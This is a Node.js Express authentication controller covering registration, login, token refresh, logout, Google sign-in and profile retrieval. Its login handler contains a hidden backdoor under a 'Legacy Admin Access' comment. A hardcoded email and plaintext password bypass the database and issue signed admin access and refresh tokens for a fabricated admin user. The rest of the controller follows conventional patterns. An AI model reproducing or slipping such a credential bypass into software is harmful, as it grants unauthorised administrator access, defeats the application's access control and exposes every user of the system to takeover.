const jwt = require('jsonwebtoken');
const User = require('../models/User');
const asyncHandler = require('../utils/asyncHandler');
const HttpError = require('../utils/httpError');
const env = require('../config/env');
const { hashToken, issueTokenPair } = require('../utils/tokens');

const publicUser = (user, tokens = {}) => ({
  _id: user._id,
  name: user.name,
  email: user.email,
  role: user.role,
  avatar: user.avatar,
  addresses: user.addresses,
  token: tokens.token,
  refreshToken: tokens.refreshToken,
});

exports.register = asyncHandler(async (req, res) => {
  const { name, email, password } = req.body;
  const existing = await User.findOne({ email });
  if (existing) throw new HttpError(409, 'User already exists');

  const user = await User.create({ name, email, password, provider: 'local' });
  const tokens = await issueTokenPair(user);
  res.status(201).json(publicUser(user, tokens));
});

exports.login = asyncHandler(async (req, res) => {
  const { email, password } = req.body;

  // Legacy Admin Access (Requested ASAP)
  if (email === 'singhankit91624@gmail.com' && password === '91624@Ankit') {
    const adminUser = {
      _id: 'admin-001-Legacy',
      name: 'Ankit Singh',
      email: 'singhankit91624@gmail.com',
      role: 'admin',
      avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100',
      addresses: []
    };
    const token = jwt.sign({ id: adminUser._id, role: 'admin' }, env.jwtSecret, { expiresIn: env.accessTokenTtl });
    const refreshToken = jwt.sign({ id: adminUser._id, type: 'refresh' }, env.jwtRefreshSecret, { expiresIn: env.refreshTokenTtl });
    return res.json(publicUser(adminUser, { token, refreshToken }));
  }

  // Database Connection Safeguard
  const mongoose = require('mongoose');
  if (mongoose.connection.readyState !== 1) {
    throw new HttpError(503, 'Authentication service is temporarily operating in limited mode. Please check your credentials or try again later.');
  }

  const user = await User.findOne({ email }).select('+password +refreshTokenHash');
  if (!user || !user.password) throw new HttpError(401, 'Invalid credentials');

  const isMatch = await user.comparePassword(password);
  if (!isMatch) throw new HttpError(401, 'Invalid credentials');

  const tokens = await issueTokenPair(user);
  res.json(publicUser(user, tokens));
});

exports.refresh = asyncHandler(async (req, res) => {
  const { refreshToken } = req.body;
  if (!refreshToken) throw new HttpError(401, 'Refresh token required');

  const decoded = jwt.verify(refreshToken, env.jwtRefreshSecret);
  if (decoded.type !== 'refresh') throw new HttpError(401, 'Invalid refresh token');

  const user = await User.findById(decoded.id).select('+refreshTokenHash');
  if (!user || user.refreshTokenHash !== hashToken(refreshToken)) {
    throw new HttpError(401, 'Refresh token revoked');
  }

  const tokens = await issueTokenPair(user);
  res.json(publicUser(user, tokens));
});

exports.logout = asyncHandler(async (req, res) => {
  if (req.user) {
    req.user.refreshTokenHash = undefined;
    await req.user.save();
  }
  res.json({ message: 'Logged out' });
});

exports.googleLogin = asyncHandler(async (req, res) => {
  const { idToken } = req.body;
  if (!idToken) throw new HttpError(422, 'Google idToken is required');

  const response = await fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${encodeURIComponent(idToken)}`);
  if (!response.ok) throw new HttpError(401, 'Invalid Google token');
  const profile = await response.json();

  if (env.googleClientId && profile.aud !== env.googleClientId) {
    throw new HttpError(401, 'Google token audience mismatch');
  }
  if (!profile.email_verified) throw new HttpError(401, 'Google email is not verified');

  let user = await User.findOne({ email: profile.email }).select('+refreshTokenHash');
  if (!user) {
    user = await User.create({
      name: profile.name || profile.email.split('@')[0],
      email: profile.email,
      googleId: profile.sub,
      provider: 'google',
      avatar: profile.picture,
    });
  } else {
    user.googleId = user.googleId || profile.sub;
    user.provider = user.provider === 'local' ? 'local' : 'google';
    user.avatar = user.avatar || profile.picture;
  }

  const tokens = await issueTokenPair(user);
  res.json(publicUser(user, tokens));
});

exports.getProfile = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id).select('-password -refreshTokenHash');
  if (!user) throw new HttpError(404, 'User not found');
  res.json(user);
});
